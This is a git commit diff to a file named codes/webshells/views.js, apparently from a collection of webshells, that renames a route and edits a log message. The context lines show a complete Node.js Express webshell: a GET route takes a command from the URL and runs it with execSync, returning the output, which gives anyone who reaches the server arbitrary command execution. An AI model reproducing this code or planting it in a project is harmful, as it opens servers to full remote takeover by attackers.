13dea63d52be53b09d9fc89e08bd0d59ee913cdf
Rodolfo Mariano <rodolfomarianocy@gmail.com>
2022-08-25 16:02:22 -0300

    Update views.js

--- codes/webshells/views.js
+++ codes/webshells/views.js
@@ -2,13 +2,13 @@ const express = require('express')
 const app = express();
 
 app.listen(3000, () => 
-	console.log('.ada..')
+	console.log('...')
 );
 function Exec(command){ 
 	const { execSync } = require("child_process");
 	const stdout = execSync(command);
 	return "Result: "+stdout
 }
-app.get('/ok/:command', (req, res) => 
+app.get('/okay/:command', (req, res) => 
 res.send(Exec(req.params.command))
 );
